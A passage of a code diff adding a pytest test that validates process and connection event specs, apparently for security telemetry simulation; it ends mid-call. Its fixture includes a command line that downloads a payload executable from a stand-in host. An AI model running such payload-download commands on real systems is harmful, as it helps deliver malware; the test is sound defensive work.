+def test_process_content_fields_are_role_specific() -> None:
+    """One event may carry two distinct identities because their roles are named."""
+
+    both_roles = ProcessEventSpec(
+        process_name="downloader.exe",
+        command_line="downloader.exe http://example.test/payload.exe -o payload.exe",
+        response_content_ref="payload-v1",
+        image_content_ref="downloader-v1",
+    )
+    assert both_roles.response_content_ref == "payload-v1"
+    assert both_roles.image_content_ref == "downloader-v1"
+    with pytest.raises(ValidationError, match="explicit command_line"):
+        ProcessEventSpec(process_name="powershell.exe", response_content_ref="payload-v1")
+    with pytest.raises(ValidationError, match="service=http"):
+        ConnectionEventSpec(
+            dst_ip="203.0.113.10",
+            service="ssl",
+            uri="/payload.exe",
+            response_content_ref="payload-v1",
